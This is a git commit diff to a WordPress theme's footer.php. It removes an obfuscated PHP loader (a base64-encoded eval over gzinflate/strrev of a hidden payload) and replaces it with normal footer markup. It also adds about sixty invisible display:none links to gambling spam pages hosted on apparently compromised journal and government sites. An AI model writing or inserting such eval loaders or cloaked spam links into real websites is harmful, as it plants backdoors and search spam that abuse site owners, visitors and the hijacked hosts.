9cb19f2ec713dd39cf3b8eb375b5cf0bba202750
BHeart22 <50254973+BHeart22@users.noreply.github.com>
2022-11-20 17:16:34 +0700

    Update footer.php

--- footer.php
+++ footer.php
@@ -1,7 +1,88 @@
-<?php
+<?php do_action( 'thim_above_footer_area' ); ?>
 
-$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
-$uk45 = "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";
-eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
-exit;
-?>
+<footer id="colophon" class="<?php thim_footer_class(); ?>">
+	<?php if ( is_active_sidebar( 'footer' ) ) : ?>
+        <div class="footer">
+            <div class="container">
+                <div class="row">
+					<?php dynamic_sidebar( 'footer' ); ?>
+                </div>
+            </div>
+        </div>
+	<?php endif; ?>
+
+	<?php do_action( 'thim_copyright_area' ); ?>
+
+</footer><!-- #colophon -->
+</div><!--end main-content-->
+
+<?php do_action( 'thim_end_content_pusher' ); ?>
+
+</div><!-- end content-pusher-->
+
+<?php do_action( 'thim_end_wrapper_container' ); ?>
+
+
+</div><!-- end wrapper-container -->
+
+<?php wp_footer(); ?>
+<a style="display:none" href="https://docomomobrasil.com/revista-novo/public/journals/4/slot-deposit-dana/">https://docomomobrasil.com/revista-novo/public/journals/4/slot-deposit-dana/</a>
+<a style="display:none" href="https://revista.fdci.edu.br/">https://revista.fdci.edu.br/</a>
+<a style="display:none" href="http://somehide.org/slot-gacor-maxwin/">http://somehide.org/slot-gacor-maxwin/</a>
+<a style="display:none" href="http://dopovidi-nanu.org.ua/sites/default/files/slot-gacor/">http://dopovidi-nanu.org.ua/sites/default/files/slot-gacor/</a>
+<a style="display:none" href="http://istu.edu.ua/wp-content/uploads/2022/04/slot-deposit-pulsa/">http://istu.edu.ua/wp-content/uploads/2022/04/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://theshillonga.com/public/journals/3/slot-deposit-dana/">https://theshillonga.com/public/journals/3/slot-deposit-dana/</a>
+<a style="display:none" href="https://cadlab.fsb.hr/files/slot-deposit-dana/">https://cadlab.fsb.hr/files/slot-deposit-dana/</a>
+<a style="display:none" href="http://epass.khnu.km.ua/slot-deposit-pulsa/">http://epass.khnu.km.ua/slot-deposit-pulsa/</a>
+<a style="display:none" href="http://mev.khnu.km.ua/wp-content/uploads/2022/07/slot-pulsa/">http://mev.khnu.km.ua/wp-content/uploads/2022/07/slot-pulsa/</a>
+<a style="display:none" href="https://anabaptismtoday.co.uk/public/site/slot-gacor/">https://anabaptismtoday.co.uk/public/site/slot-gacor/</a>
+<a style="display:none" href="http://ojs.khnu.km.ua/wp-content/uploads/2018/10/slot-deposit-dana/">http://ojs.khnu.km.ua/wp-content/uploads/2018/10/slot-deposit-dana/</a>
+<a style="display:none" href="http://csitjournal.khmnu.edu.ua/public/journals/1/slot-deposit-dana/">http://csitjournal.khmnu.edu.ua/public/journals/1/slot-deposit-dana/</a>
+<a style="display:none" href="http://tmit.khnu.km.ua/wp-content/uploads/2022/10/slot-deposit-pulsa/">http://tmit.khnu.km.ua/wp-content/uploads/2022/10/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://plum.co.az/wp-content/uploads/2022/10/slot-gacor/">https://plum.co.az/wp-content/uploads/2022/10/slot-gacor/</a>
+<a style="display:none" href="http://csitjournal.khmnu.edu.ua/slot-deposit-pulsa/">http://csitjournal.khmnu.edu.ua/slot-deposit-pulsa/</a>
+<a style="display:none" href="http://ukrpoldialogs.khnu.km.ua/wp-content/uploads/2022/05/slot-deposit-dana/">http://ukrpoldialogs.khnu.km.ua/wp-content/uploads/2022/05/slot-deposit-dana/</a>
+<a style="display:none" href="http://ukrpoldialogs.khnu.km.ua/wp-content/uploads/2022/01/slot-pulsa/">http://ukrpoldialogs.khnu.km.ua/wp-content/uploads/2022/01/slot-pulsa/</a>
+<a style="display:none" href="http://upc.khnu.km.ua/wp-content/uploads/2022/10/slot-gacor/">http://upc.khnu.km.ua/wp-content/uploads/2022/10/slot-gacor/</a>
+<a style="display:none" href="https://www.ncst.mw/staffprofile/public/files/pubtogel-10/">https://www.ncst.mw/staffprofile/public/files/pubtogel-10/</a>
+<a style="display:none" href="http://drkaplanbahatemizgonul.com/wp-content/uploads/2022/11/slot-deposit-pulsa/">http://drkaplanbahatemizgonul.com/wp-content/uploads/2022/11/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://kiadvany.magyarhonvedseg.hu/public/journals/2/slot-deposit-dana/">https://kiadvany.magyarhonvedseg.hu/public/journals/2/slot-deposit-dana/</a>
+<a style="display:none" href="http://ojs.fatece.edu.br/public/site/slot-gacor/">http://ojs.fatece.edu.br/public/site/slot-gacor/</a>
+<a style="display:none" href="https://anabaptismtoday.co.uk/styles/slot88/">https://anabaptismtoday.co.uk/styles/slot88/</a>
+<a style="display:none" href="https://journal.seamolec.org/files/site/slot-online-gacor/">https://journal.seamolec.org/files/site/slot-online-gacor/</a>
+<a style="display:none" href="https://chasopys-ppp.dp.ua/public/site/slot-deposit-pulsa/">https://chasopys-ppp.dp.ua/public/site/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://revistas.pge.sp.gov.br/public/site/slot-gacor/">https://revistas.pge.sp.gov.br/public/site/slot-gacor/</a>
+<a style="display:none" href="https://revistas.pge.sp.gov.br/styles/slot-deposit-pulsa/">https://revistas.pge.sp.gov.br/styles/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://www.ncst.mw/wp-content/uploads/slot-online/">https://www.ncst.mw/wp-content/uploads/slot-online/</a>
+<a style="display:none" href="https://tikinet.com.br/wp-content/uploads/slot888/">https://tikinet.com.br/wp-content/uploads/slot888/</a>
+<a style="display:none" href="http://www.izmirakademi.org/-/joker123/">http://www.izmirakademi.org/-/joker123/</a>
+<a style="display:none" href="https://tikinet.com.br/wp-content/uploads/situs-slot-gacor/">https://tikinet.com.br/wp-content/uploads/situs-slot-gacor/</a>
+<a style="display:none" href="https://anabaptismtoday.co.uk/public/journals/1/slot-deposit-pulsa/">https://anabaptismtoday.co.uk/public/journals/1/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://jcsit.ir/ojs/public/site/slot-gacor-maxwin/">https://jcsit.ir/ojs/public/site/slot-gacor-maxwin/</a>
+<a style="display:none" href="http://newizvestia.vspu.ru/public/site/link-slot-gacor/">http://newizvestia.vspu.ru/public/site/link-slot-gacor/</a>
+<a style="display:none" href="http://ojs.faculdademetropolitana.edu.br/public/site/slot-deposit-dana/">http://ojs.faculdademetropolitana.edu.br/public/site/slot-deposit-dana/</a>
+<a style="display:none" href="http://vocesyrealidadeseducativas.com/ojs/public/site/joker123/">http://vocesyrealidadeseducativas.com/ojs/public/site/joker123/</a>
+<a style="display:none" href="https://esd.kps.ku.ac.th/refund/imgnews/slot-gacor/">https://esd.kps.ku.ac.th/refund/imgnews/slot-gacor/</a>
+<a style="display:none" href="http://conference.4moms.com/">http://conference.4moms.com/</a>
+<a style="display:none" href="https://researchvilla.org/public/site/slot-gacor-2022/">https://researchvilla.org/public/site/slot-gacor-2022/</a>
+<a style="display:none" href="https://www.publicacoes.unirios.edu.br/docs/manual/slot-deposit-pulsa/">https://www.publicacoes.unirios.edu.br/docs/manual/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://japanenviro.org/public/site/slot-gacor/">https://japanenviro.org/public/site/slot-gacor/</a>
+<a style="display:none" href="https://rpto.ipleiria.pt/public/site/slot-gacor/">https://rpto.ipleiria.pt/public/site/slot-gacor/</a>
+<a style="display:none" href="https://philol-izvestia.vspu.ru/docs/manual/slot-online/">https://philol-izvestia.vspu.ru/docs/manual/slot-online/</a>
+<a style="display:none" href="https://fdci.edu.br/js/slot-gacor-maxwin/">https://fdci.edu.br/js/slot-gacor-maxwin/</a>
+<a style="display:none" href="http://philol-izvestia.vspu.ru/public/journals/1/rtp-live/">http://philol-izvestia.vspu.ru/public/journals/1/rtp-live/</a>
+<a style="display:none" href="https://revistas.pge.sp.gov.br/js/slot-gacor-maxwin/">https://revistas.pge.sp.gov.br/js/slot-gacor-maxwin/</a>
+<a style="display:none" href="https://rpto.ipleiria.pt/slot-gacor/">https://rpto.ipleiria.pt/slot-gacor/</a>
+<a style="display:none" href="https://www.smartscitech.com/public/journals/2/slot-gacor/">https://www.smartscitech.com/public/journals/2/slot-gacor/</a>
+<a style="display:none" href="https://revistabr.docomomobrasil.com/public/site/slot-gacor-2022/">https://revistabr.docomomobrasil.com/public/site/slot-gacor-2022/</a>
+<a style="display:none" href="https://malawidiaspora.gov.mw/slot-deposit-pulsa/">https://malawidiaspora.gov.mw/slot-deposit-pulsa/</a>
+<a style="display:none" href="https://revistas.unanleon.edu.ni/situs-slot-deposit-dana/">https://revistas.unanleon.edu.ni/situs-slot-deposit-dana/</a>
+<a style="display:none" href="https://ijbtob.org/public/slot-gacor/">https://ijbtob.org/public/slot-gacor/</a>
+<a style="display:none" href="http://revistaaristas.tij.uabc.mx/public/slot-deposit-dana/">http://revistaaristas.tij.uabc.mx/public/slot-deposit-dana/</a>
+<a style="display:none" href="https://dopovidi-nanu.org.ua/ojs/styles/situs-slot-gacor/">https://dopovidi-nanu.org.ua/ojs/styles/situs-slot-gacor/</a>
+<a style="display:none" href="http://ojs3.bkstm.org/public/journals/1/togel-online/">http://ojs3.bkstm.org/public/journals/1/togel-online/</a>
+<a style="display:none" href="https://rpto.ipleiria.pt/styles/slot-deposit-pulsa/">https://rpto.ipleiria.pt/styles/slot-deposit-pulsa/</a>
+<a style="display:none" href="http://app.fiepr.org.br/revistacientifica/public/site/slot-deposit-dana/">http://app.fiepr.org.br/revistacientifica/public/site/slot-deposit-dana/</a>
+<a style="display:none" href="n-eu.iasv.ru/public/journals/1/slot-deposit-pulsa/">n-eu.iasv.ru/public/journals/1/slot-deposit-pulsa/</a>
+</body>
+</html>
